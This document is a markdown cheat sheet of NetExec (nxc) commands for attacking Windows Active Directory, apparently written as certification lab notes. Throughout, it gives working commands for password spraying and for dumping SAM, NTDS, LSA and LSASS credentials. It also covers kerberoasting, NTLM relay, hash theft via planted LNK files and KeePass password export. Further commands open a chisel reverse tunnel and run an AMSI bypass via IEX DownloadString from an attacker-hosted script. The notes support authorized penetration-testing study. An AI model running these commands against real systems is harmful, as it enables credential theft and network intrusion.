# General

# Non-Credentialed enumeration
## Basic SMB Recon
* Scan for live targets
```bash
nxc smb 172.16.10.0/24
```
* Scan for smb signing disabled and generate a relay list
```bash
nxc smb 172.16.10.0/24 --gen-relay-list relaylist.txt
```

## Null/Anon Sessions
* Enumerate password policy
```bash
nxc smb 172.16.10.10 -u '' -p '' --pass-pol
```
* Export password policy to json and clean up
```bash
nxc smb 172.16.10.10 -u '' -p '' --pass-pol --export passpol.txt

# Clean up the exported json
sed -i "s/'/\"/g" passpol.txt
```
* Enumerate users
```bash
nxc smb 172.16.10.10 -u '' -p '' --users --export users.txt

# Clean up the exported list
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt
```
* Enumerate users through RID brute force
> By default, --rid-brute only tries 4000 RIDs. Specify an upper limit with --rid-brute [max rid]  
```bash
nxc smb 172.16.10.10 -u '' -p '' --rid-brute
```
* Enumerating shares
```bash
nxc smb $IP -u '' -p '' --shares
```

## Password Spraying
## Targeting SMB and general usage
* Create a list of usernames and password (for this example, users.txt and passwords.txt)
> -u and -p can both either take a single name, space separated names, or a filename
```bash
# multiple names and single password
nxc smb $IP -u name1 name2 name3 -p password1

# single name and multiple passwords
nxc smb $IP -u name1 -p password1 password2 password3

# lists
nxc smb $IP -u users.txt -p passwords.txt
```
> By default, nxc will stop on the first match it finds, to try them all, use --continue-on-success  
* Testing if credentials are still valid (testing one username per one password in a list
```bash
nxc smb $IP -u foundusers.txt -p matchingpasswords.txt --no-bruteforce --continue-on-success
```
* Testing Local Accounts
> Use the --local-auth flag to test local accounts
```bash
nxc smb $IP -u users.txt -p passwords.txt --local-auth --continue-on-success
```

## Account Status
* Green = Username and password is valid
* Red = Invalid username and password
* Magenta = Username and password is valid, but auth unsuccessful
> Auth maybe unsuccessful for alot reasons, one of them being a password change is required  
* change a users password via impackets smbpassword
```bash
smbpassword -r [domain or IP] -u [user]
```
## Targeting WinRM
> winrm gives command execution on the target
```bash
nxc winrm $IP -u foundusers.txt -p foundpasswords.txt --continue-on-success
```
## Targeting LDAP
> ldap requires the use of FQDN's. Either add to hosts file or use the targets DNS
```bash
nxc smb ldap -u users.txt -p passwords.txt
```
## Targeting MSSQL
> SQL, SSH, and FTP are unique in that they can use local users, their own local db users, or domain users. You must specify the domain name if trying a domain account.
```bash
#AD Domain account
nxc mssql $IP -u [user] -p [pass] -d [domain]

#Local Windows Account
nxc mssql $IP -u [user] -p [pass] -d .

#SQL Account
nxc mssql $IP -u [user] -p [pass] --local-auth
```
> Lookout for reused passwords. A DB admin may use the same credentials as their domain account just stored in the DB

# Credentialed enumeration
## Accounts in group policy objects
```bash
# search for passwords in group policy objects
nxc smb $IP -u [user] -p [pass] -M gpp_password

# Search for autologin accounts
nxc smb $IP -u [user] -p [pass] -M gpp_autologin
```
## Modules
* List all modules for the protocol
```bash
nxc smb -L
```
* View Module Options
```bash
nxc ldap -M user-desc --options

# example
nxc ldap -u [user] -p [pass] -M user-desc -o KEYWORDS=pwd,admin
```
## MSSQL Enum & Attacks
* Execute an SQL Query
```bash
nxc mssql $IP -u [user] -p [pass] -q
```
* Useful DB Queries
```bash
# Get all DB names
nxc mssql $IP -u [user] -p [pass] -q 'SELECT name FROM master.dbo.sysdatabases'

# Get table names form a DB
nxc mssql $IP -u [user] -p [pass] -q 'SELECT table_name from [DB].INFORMATION_SCHEMA.TABLES'

# Dump contents of a table
nxc mssql $IP -u [user] -p [pass] -q 'SELECT * from [db name].[dbo].[table name]'
```
## OS command execution
```bash
# Using cmd
nxc mssql $IP -u [user] -p [pass] -x whoami

# Using Powershell
nxc mssql $IP -u [user] -p [pass] -X whoami #Note the capital 'X'
```
> Remember you'll be executing commands under the context under which SQL is running. Not necessarily an admin  
## Transferring Files
```bash
# Upload a file
nxc mssql $IP -u [user] -p [pass] --put-file [local file path] [target file path]
#ex
nxc mssql 172.168.15.10 -u julio -p [pass] --put-file /etc/passwd c:/users/public/passwd

# Download a file
nxc mssql $IP -u [user] -p [pass] --get-file [download file path] [save path]
#ex
nxc mssql 172.16.15.10 -u julio -p [pass] --get-file c:/users/public/passwd passwd
```
## SQL Priv-Esc module
> Used to enumerate and escalate privileges via 'execute as login' and 'db_owner'  
```bash
# Enum privileges
nxc mssql $IP -u [user] -p [pass] -M mssql_priv

# Escalate if available
nxc mssql $IP -u [user] -p [pass] -M mssql_priv -o ACTION=privesc

# Rollback privileges
nxc mssql $IP -u [user] -p [pass] -M mssql_priv -o ACTION=rollback
```
## Kerberoasting
> find kerberoastable accounts and get their hash.  
> Note: You must use the FQDN of the DC. Add it to hosts or use the DC's DNS.  
```bash
nxc ldap [FQDN of DC] -u [user] -p [pass] --kerberoasting kerberoasting.out
```
## Spidering and LOTL
> Start with useing '--shares' to find out which shares you can access
```bash
# Finding all files
nxc smb $IP -u [user] -p [pass] --spider [sharename] --regex .

# Finding files by a pattern (ie: extension)
nxc smb $IP -u [user] -p [pass] --spider [sharename] -pattern txt

# Searching file contents
nxc smb $IP -u [user] -p [pass] --spider [sharename] --content --regex [search term]
```
* File transfer
```bash
# --get-file
nxc smb $IP -u [user] -p [pass] --share [sharename] --get-file [remote file] [save file]

# --put-file
nxc smb $IP -u [user] -p [pass] --share [sharename] --put-file [local file] [remote file]
```
## Spider_plus
> Use this to exclude shares like IPC$,print$, NETLOGON, SYSVOL
```bash
# Exclude directories
nxc smb $IP -u [user] -p [pass] -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL

# Downlaod all files in the shares
nxc smb $IP -u [user] -p [pass] -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false
```
## NXC with Proxychains
## Scenario
![network unreachable diagrom](images/network-unreachable.jpg)

## Setup the Tunnel using [Chisel](https://github.com/jpillora/chisel)
### Reverse Tunnel
* Setup up the listener on attack host
```bash
./chisel server --reverse
```
* Upload and execute chisel using nxc
```bash
nxc smb 10.129.204.133 -u [user] -p [pass] --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
nxc smb 10.129.204.133 -u [user] -p [pass] -x 'C:\Windows\Temp\chisel.exe client [attacker ip:port] R:socks'
```
* Configure Proxychains to use chisel
```bash
# Add the following to the end of /etc/proxychians4.conf:
socks5  127.0.0.1 1080
```
* Test the configuration
```bash
sudo proxychains4 -q nxc smb 172.16.1.10 -u [user] -p [pass] --shares
```
* kill the chisel client
```bash
nxc smb $IP -u [user] -p [pass] -X 'Stop-Process -Name chisel -Force'
```
### Windows as the server with linux client
* Setup the listener on the pivot host
```bash
nxc smb $IP -u [user] -p [pass] -x 'C:\Windows\Temp\chisel.exe server --socks5'
```
* Connecting from the attack host
```bash
sudo chisel client $IP:8080 socks
```
* Test
```bash
sudo proxychains4 -q nxc smb $IP 0u -u [user] -p [pass] --shares
```
## Stealing Hashes
## Slinky Module
> Creates a LNK file with the icon attribute pointing to an attack host  
> 2 mandatory options - Server (Attack host) and Name (Arbitrary file name) and one optional option - Cleanup  
> Requires a writable share  
* Execute the attack
```bash
proxychains4 -q nxc smb $IP -u [user] -p [pass] -M slinky -o SERVER=[AttackerIP] NAME=[Attractive Name]
```
* Start Responder to capture the hashes
> Make sure the smb option is enabled in responder
```bash
sudo responder -I tun0
```
* Crack the hash, if crackable
## NTLM Relay
> Relay the NTLMv2 hash directly to other machines with SMB Signing disabled. See [Basic SMB Recon](https://github.com/Chvxt3r/HackTools/blob/main/cert_notes/htb/nxc.md#basic-smb-recon) for list generation
* After starting responder, start impacket-ntlmrelayx(ntlmrelayx.py)
```bash
sudo proxychains4 -q impacket-ntlmrelayx -tf [relayfile.txt] -smb2support --no-http
```
> If a user has permissions(admin), ntlmrelayx will automatically dump the sam and provide local hashes.
## Cleanup
* Removing the LNK file
```bash
proxychains4 -q nxc smb $IP -u [user] -p [pass] -M slinky -o NAME=[LNK name] CLEANUP=YES
```
## drop-sc Module
> Uses '.searchConnector-ms' and '.library-ms' files rather than LNK files.  
> Required Options: URL (URL must be escaped with double backslashes) ex: URL=\\\\10.10.14.33\\secret  
> Optional: SHARE=[sharename], FILENAME=[filename], CLEANUP=True  
* Execute the drop-sc
```bash
proxychains4 nxc smb $IP -u [user] -p [pass] -M drop-sc URL=\\\\[AttackerIP]\\[file] SHARE=[share name] FILENAME=[filename]
```
* Drop-sc can be relayed the same as LNK above
* Cleanup
```bash
proxychains4 -q nxc smb $IP -u [user] -p [pass] -M drop-sc -o CLEANUP=True FILENAME=[filename]
```

# Admin Credentialed enumeration
## SMB options available with admin or non-admin account
## SMB Commands
|Command|Description|
|-------|-----------|
|`nxc smb <target> -u <u> -p <p> --loggedon-users`|Enumerate logged on users on the target|
|`nxc smb <target> -u <u> -p <p> --sessions`|Enumerate active sessions on the target|
|`nxc smb <target> -u <u> -p <p> --disks`|Enumerate disks on the target|
|`nxc smb <target> -u <u> -p <p> --computers`|Enumerate computer on the target domain|
|`nxc smb <target> -u <u> -p <p> --wmi`|Issues the specified WMI query|
|`nxc smb <target> -u <u> -p <p> --wmi-namespace`|WMI Namespace (default: root\cimv2)|
|`nxc smb <target> -u <u> -p <p> --rid-brute`|Enumerate users by bruteforcing the RID on the target|
|`nxc smb <target> -u <u> -p <p> --local-groups`|Enumerate local groups, if a group is specified then its members are enumerated|
|`nxc smb <target> -u <u> -p <p> --shares`|Enumerate permissions on all shares of the target|
|`nxc smb <target> -u <u> -p <p> --users`|Enumerate domain users on the target|
|`nxc smb <target> -u <u> -p <p> --groups`|Enumerate domain groups on the target|
|`nxc smb <target> -u <u> -p <p> --pass-pol`|Password policy of the domain|
## Enumerate active sessions / logged on users on a target machine
* Enumerate just logged on users
```bash
nxc smb $IP -u [user] -p [pass] --loggedon-users
```
* Check if a particular user is logged on
```bash
nxc smb $IP -u [user] -p [pass] --loggedon-users-filter [user]
```
* Check for a user session (not logged in but accessing the computer with credentials)
```bash
nxc smb $IP -u [user] -p [pass] --sessions
```
## Enumerate LAPS
> Local Administrator Password Solution
```bash
nxc ldap $FQDN -u [user] -p [pass] -M laps
```
> Even if this user doens't have LAPS access, it will tell you who does.
* Run laps on multiple hosts and dumping sam
```bash
nxc smb [host list .txt] -u [user] -p [pass] --laps --sam
```
## LDAP and RDP Enumeration
## LDAP & RDP Commands
|Command|Description|
|-------|-----------|
|`nxc ldap <target> -u <u> -p <p> --users`|Enumerate enabled domain users|
|`nxc ldap <target> -u <u> -p <p> --groups`|Enumerate domain groups|
|`nxc ldap <target> -u <u> -p <p> --password-not-required`|Get the list of users with flag PASSWD_NOTREQD|
|`nxc ldap <target> -u <u> -p <p> --trusted-for-delegation`|Get the list of users and computers with flag TRUSTED_FOR_DELEGATION|
|`nxc ldap <target> -u <u> -p <p> --admin-count`|Get objets that had the value adminCount=1|
|`nxc ldap <target> -u <u> -p <p> --get-sid`|Get domain sid|
|`nxc ldap <target> -u <u> -p <p> --gmsa`|Enumerate GMSA passwords|
|`nxc rdp <target> -u <u> -p <p> --nla-screenshot`|Screenshot RDP login prompt if NLA is disabled|
|`nxc rdp <target> -u <u> -p <p> --screenshot`|Screenshot RDP if connection success|
|`nxc rdp <target> -u <u> -p <p> --screentime SCREENTIME`|Time to wait for desktop image|
|`nxc rdp <target> -u <u> -p <p> --res RES`|Resolution in "WIDTHxHEIGHT" format. Default: "1024x768"|
## Group Managed Service Accounts
* Enumeration
```bash
nxc winrm $FQDN -u [user] -p [pass] -X 'Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword'
```
* Retrieving gMSA passwords
> must have credentials permissions, as enumerated above  
```bash
nxc ldap $FQDN -u [user] -p [pass] --gmsa
```
# Command Execution
## Enumeration
> Need to check for the presence of UAC before attempt to execute commands as local admin. By default, only RID 500 can execute commands. Either must be set to `1` to allow command execution as a different member of the administrators group. `LocalAccountTokenFilterPolicy` only applies to local accounts. 
```cmd
# The 2 keys controlling access through UAC
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
```
* Changing the registry(LocalAccountTokenFilterPolicy)
```bash
nxc smb [$IP] -u [Admin User] -p [password] --local-auth -x 'reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'
```
## Command Execution with SMB
> Command execution attempts the following 4 methods in this order `wmiexec -> atexec -> smbexec -> mmcexec`. You can force using the `--exec-method` flag.  
> Alternatively, you can execute cmd shell commands with `-x`, or powershell commands with `-X`. `-X` will by default, run an AMSI bypass, Obfuscate the payload, and execute the payload.  
### Runnign a Custom AMSI Bypass
> You can specify an AMSI bypass using the `--amsi-bypass` flag.
```bash
# Custom amsi bypass example
nxc smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X '$PSVersionTable' --amsi-bypass shantanukhande-amsi.ps1
```
* You'll need to create and host the bypass.
```bash
# Create the script:
echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.33/shantanukhande-amsi.ps1');" > amsibypass.txt

# Throw up a quick web host to provide the script
python3 -m http.server 80
```
> Remember, the script *executes on the victim machine*. That's why we need the hosting.  
## Command Execution with WinRM
> Same as SMB, use `-x` for cmd and `-X` for powershell.  
> Optionally, we can specify some new options.  

|Flag|Description|
|----|-----------|
|`--port [port]`|To Select a custom port for WinRM connection|
|`--ssl`|To connect to SSL Enabled WinRM|
|'--ignore-ssl-cert`|To ignore certificate verification when connecting to SSL|
## Command Exectution with SSH
> Optional `--key-file` flag to provide a key. Key must be in OPENSSH format.  
```bash
# Example
nxc ssh [$IP] -u [user] --key-file [key file] -p "" -x whoami
```
## Finding Secrets and Using them
## SAM (Security Accounts Manager)
* Dumping the SAM
```bash
nxc smb [$IP] -u [user] -p [password] --sam
```
## NTDS
> Requires DCSync privileges.  
```bash
nxc smb [$IP] -u [user] -p [password] --ntds
```
> Optionally, specifying `--user` to specify a user, and `--enabled` to dump only enabled users.  

## LSA
```bash
nxc smb [$IP] -u [user] -p [password] --lsa
```
> `$DCC2$` are domain cached credentials. DCC cannot be used for PTH. For cracking, grab the part after `$DCC2$`, and use hashcat module 2100.  
```bash
# Example
INLANEFREIGHT.HTB/julio:$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3

# Becomes
$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3

# Use Cut to fix up a list of hashes
cat /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.cached| cut -d ":" -f 2
```
## LSASS
* Lsassy Module
```bash
nxc smb [$IP] -u [user] -p [pass] -M lsassy
```
* Procdump Module
```bash
nxc smb [$IP] -u [user] -p [pass] -M procdump
```
* handlekatz (Uses cloned handles to create an obfuscated memory dump)
```bash
nxc smb [$IP] -u [user] -p [pass] -M handlekatz
```
* Nanodump (Hijacks a handle for creating the minidump)
```bash
nxc smb [$IP] -u [user] -p [pass] -M nanodump
```

# Remote Shell

# Modules
## Popular Modules
## LDAP
* Get-Network
> Any domain user can dump the entire domains DNS, similar to a zone transfer.  
```bash
# Get IP's and hostnames
nxc ldap [$IP] -u [user] -p [pass] -M get-network -o ALL=True
```
* laps
> Dumps LAPS passwords for every computer a user has access to, or only a specific computer. Does support wildcards(*) when searching for computers.  
```bash
nxc ldap [$FQND] -u [user] -p [pass] -M laps
```
* MAQ (Machine Account Quota)
> Indicates the number of computer accounts a user is allowed to create on the domain. Useful for Resource Based Constrained Delegation.  
```bash
nxc ldap [$FQDN] -u [user] -p [pass] -M maq
```
* dacleread
> Allows us to read and export one or more domain object ACL's.  
```bash
# Usage
nxc ldap [$FQDN] -u [user] -p [pass] -M daclread -o TARGET=[target] ACTION=read
```
```bash
# Search for what users have a specific permission, such as DCSync
nxc ldap [$FQDN] -u [user] -p [pass] -M dacleread -o TARGET-DN='DC=[DC Hostname],DC=[Domain]' ACTION=read RIGHTS=DCSync
```
## SMB
> Most of the SMB modules are going to need admin (Pwn3d!) rights.  
* get_netconnections
> Uses WMI to retrieve network information (basically an IPCONFIG).  
```bash
nxc smb [$IP] -u [user] -p [pass] -M get_netconnections
```
* ioxidresolver
> Uses RPC to retrieve network information. Does not retrieve IPv6 addresses.  
```bash
nxc smb [$IP] -u [user] -p [pass] -M ioxidresolver
```
* keepass_discover
```bash
nxc smb [$IP] -u [user] -p [pass] -M keepass_discover
```
* keepass Exploitation
1. Locate the keepass file location from keepass_discover
2. Add a trigger to the configuration file using nxc
```bash
nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PATH=[path found in keepass_discover]
# Note: Make sure to use a backslash (/) or double slash (\\) for the file path.
```
3. Wait for the user to open keepass. We can force this with the `ACTION=RESTART` flag
```bash
nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=RESTART
```
4. Poll and wait for the exported data with `ACTION=POLL`
```bash
nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=POLL
```
5. Use grep to search for passwords
```bash
cat /tmp/export.xml | grep -i protectinmemory -A 5
```
6. Cleanup
```bash
nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=CLEAN KEEPASS_CONFIG-PATH=[path found in keepass_discover]
```
* keepass exploitation all at once.
```bash
nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=[path found in keepass_discover]
```
> If we get an error in the password, it will be in `/tmp/export.xml`.  
* Enable RDP
```bash
nxc smb [$IP] -u [user] -p [pass] -M rdp -o ACTION=enable
```
## Vulnerability Scan Modules
* [ZeroLogon](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)
> Must be run on a DC.  
```bash
nxc smb [$IP] -M ZeroLogon
```
* [PetitPotam](https://github.com/topotam/PetitPotam)
```bash
nxc smb [$IP] -M PetitPotam
```
* [noPAC](https://github.com/Ridter/noPac)
```bash
nxc smb [$IP] -u [user] -pass [pass] -M nopac
```
* [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)
```bash
nxc smb [$IP] -u [user] -p [pass] -M dfscoerce
```
* [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)
```bash
nxc smb [$IP] -u [user] -p [pass] -M shadowcoerce
```
* [EternalBlue(MS17-010)](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN)
```bash
nxc smb [$IP] -M ms17-010
```
# Misc
## Audit Mode
> Replaces passwords and hashes with a character of our choosing.
```bash
# in ~/.nxc/nxc.conf, edit the audit mode parameter to include the character you would like to replace the password with
```
## IPv6 Support
> Simply replace [$IP] with the IPv6 Address
## Completion Percent
> Useful when doing a large number of machines
Press `Enter` while it's running and it will drop the completion percentage
## Kerberos Authentication
> nxc supports KRB auth in `smb`,`ldap`, and `mssql`.  
> Setup kerberos like normal (Export the krb5ccname, etc)  
> As always, KRB requires an FQDN
## Username and password with KRB auth.
```bash
nxc smb [$FQDN] -u [user] -p [pass] --kerberos --shares
```
## Identify Users with kerberos auth
> This command will inform us if any of the users are vulnerable to asreproast  
```bash
nxc smb [$IP] -u [user1] [user2] [user3] -p [pass] --kerberos
```
## Using AES-128 or AES-256
```bash
nxc smb [$IP] -u [user] --aesKey [aesKey]
```
## Using the kcache(export krb5ccname=[file])
> Can use IP's with `smb` and `ldap`, but `mssql` requires a FQDN  
```bash
nxc smb [$IP] --use-kcache
```

# Database
